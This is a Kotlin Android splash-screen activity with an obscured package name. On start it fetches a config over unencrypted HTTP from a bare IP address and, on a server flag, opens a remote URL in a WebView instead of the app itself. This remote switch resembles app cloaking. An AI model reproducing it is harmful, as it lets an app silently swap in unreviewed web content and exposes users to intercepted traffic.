package com.rwAUiM.b06Ay9wD30c

import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.rwAUiM.b06Ay9wD30c.ui.MainActivity
import com.rwAUiM.b06Ay9wD30c.ui.WebActivity
import com.rwAUiM.b06Ay9wD30c.utils.LogEventUtils
import com.rwAUiM.b06Ay9wD30c.utils.OkHttpUtils
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Response
import java.io.IOException


class SplashActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.navigationBarColor = Color.TRANSPARENT
        LogEventUtils.statisticalEvent("test", "testValue", "testUsername")
        OkHttpUtils.getInstance().get(
            "http://140.238.157.120/appconfig/api/get_app_config.php?package_name=${BuildConfig.APPLICATION_ID}",
            object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    toMain()
                }

                override fun onResponse(call: Call, response: Response) {
                    val str = response.body?.string() ?: ""
                    if (str.contains("\"success\":true")) {
                        val gson = Gson()
                        val appConfig = gson.fromJson(str, AppConfig::class.java)
                        if (appConfig.configData.isWeb == 1) {
                            toWeb(appConfig.configData.webUrl)
                        } else {
                            toMain()
                        }
                    } else {
                        toMain()
                    }
                }
            })
    }

    fun toMain() {
        val intent = Intent()
        intent.setClass(this@SplashActivity, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    fun toWeb(url: String) {
        val intent = Intent()
        intent.putExtra("KEY_URL", url)
        intent.setClass(this@SplashActivity, WebActivity::class.java)
        startActivity(intent)
        finish()
    }
}